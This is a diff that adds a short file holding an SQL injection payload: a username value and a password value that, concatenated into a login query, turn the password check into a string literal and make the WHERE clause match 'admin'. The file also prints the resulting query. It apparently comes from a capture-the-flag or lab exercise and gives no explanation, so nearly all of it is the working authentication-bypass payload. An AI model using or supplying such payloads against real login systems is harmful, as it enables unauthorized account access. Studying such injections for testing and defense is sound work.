@@ -1,0 +1,5 @@
+username: a'||coalesce('dmin',
+password: )||'
+
+resulting SQL query: SELECT username, password FROM users WHERE username='a'||coalesce('dmin',' AND password=')||''
+
